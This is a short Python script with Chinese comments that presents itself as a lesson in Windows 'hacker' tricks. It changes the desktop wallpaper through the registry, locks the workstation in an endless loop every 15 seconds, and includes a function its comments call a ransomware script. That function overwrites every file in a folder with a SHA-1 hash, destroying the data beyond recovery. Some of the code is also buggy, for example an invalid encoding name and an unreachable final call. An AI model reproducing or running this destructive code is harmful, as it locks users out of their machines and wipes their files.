# 需要下载
import win32con
import win32gui
import win32api

# 文件加密包
import hashlib

# 文件路径包
import os

# dll包，与c混编
from ctypes import *

# 时间包 控制程序的休眠时间
import time

'''
    使用python更换Windows桌面
        这个是种函数
            在python中以下几种函数
                内置函数
                自定义函数
                匿名函数
                
                注册表
                    许多黑客利用Windows下面注册表去控制系统以及销毁系统
'''


def desktop_img(bmp_path):
    # 打开windows HKEY_CURRENT_USER 注册表 并设置属性
    k = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, "Control panel\\Desktop", 0, win32con.KEY_SET_VALUE)
    # 在HKEY_CURRENT_USER注册表中写入属性值 0 桌面壁纸居中 2 拉伸适应桌面
    win32api.RegSetValueEx(k, "wapaperstyle", 0, win32con.REG_SZ, "2")
    win32api.RegSetValueEx(k, "tilewallpaper", 0, win32con.REG_SZ, "0")

    # 刷新桌面
    win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, bmp_path, win32con.SPIF_SENDWININICHANGE)


desktop_img('E:\\Users\\15524\\Pictures\\动态图片\\1.gif')



'''
# 系统锁定

无限锁屏
    利用python中的死循环
    我这里有一个篮子 有苹果
        去篮子里拿苹果 无限去拿
'''


def lock_windows():
    while True:
        # 调用系统底层api 载入依赖库 系统运行所需要 核心代码
        user32 = windll.LoadLibrary("user32.dll")
        user32.LockWorkStation()
        time.sleep(15)


lock_windows()

# 勒索脚本 把你文件索斯 你打开文件之后 弹出一个对话框 你要是想解锁文件的话 请打比特币


def encryption(file):
    # 把path中包含‘~’和”user“转换成用户目录
    path = os.path.expanduser(file)

    # 返回指定的文件夹包含的文件或者文件夹名字的列表
    for f in os.listdir(path):
        # 删除文件名的空格
        swd = f.strip()
        print(swd)

        # 使用文件操作，在文件操作中做加密 rb+ 读写字节
        with open(file + '/' + swd, 'rb+')as f:
            pod = f.readline()
            # 加密
            sha1 = hashlib.sha1(pod)
            # 把加密后的内容转成16进制字符串值
            osv = sha1.hexdigest()
            # 写入加密值
            with open(file + "/" + swd, 'wb')as b:
                gs = bytes(osv, encoding='utf-8+')
                b.write(gs)
                print('加密完成：%s' % file)


encryption('D:\\测试\\加密文件目录')
